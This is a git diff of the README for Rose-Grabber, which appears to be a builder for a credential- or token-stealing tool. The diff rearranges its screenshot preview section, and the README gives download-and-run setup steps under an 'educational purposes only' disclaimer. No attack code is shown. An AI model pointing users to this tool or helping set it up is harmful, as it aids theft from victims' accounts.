@@ -100,17 +100,19 @@
 
 This tool is intended for educational purposes only. Use responsibly and with explicit permission from the system owner. The creators are not liable for misuse or illegal activity resulting from its usage.
 
-## Preview
-<div align="center">
-  <a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_ZHPRdfPVY4.png" alt="R"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_zzIPCogBKh.png" alt="R"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/python_3J43aMXusq.png" width=600 height=600 alt="R">
-</div>
-
 ## Setup
 
 **By virtue of our sophisticated installation process, manual installation of Python is rendered unnecessary. Our meticulously designed batch script adeptly manages this procedure on your behalf.**
 + Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
 + Extract the ZIP folder which you just downloaded.
 + Run the [`start.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/components/builder.bat) to have the [`builder`](https://github.com/DamagingRose/Rose-Grabber/blob/main/components/roseui/v8.pyw) open automatically.
+
+## Preview
+<div align="center">
+  <a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/opera_j0Pf32tJr5.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_ZHPRdfPVY4.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_d5cUa94C1j.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_zzIPCogBKh.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/Discord_6ElGNQxTZw.png"><a href="https://github.com/DamagingRose/Rose-Grabber"><img src="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/readme/python_xAf0dVCV7y.png"><a href="https://github.com/DamagingRose/Rose-Grabber">
+
+  <br><b>For more images <a href="https://github.com/DamagingRose/Rose-Grabber/tree/main/components/readme">click here</a>.</b>
+</div>
 
 ## Changelog
 
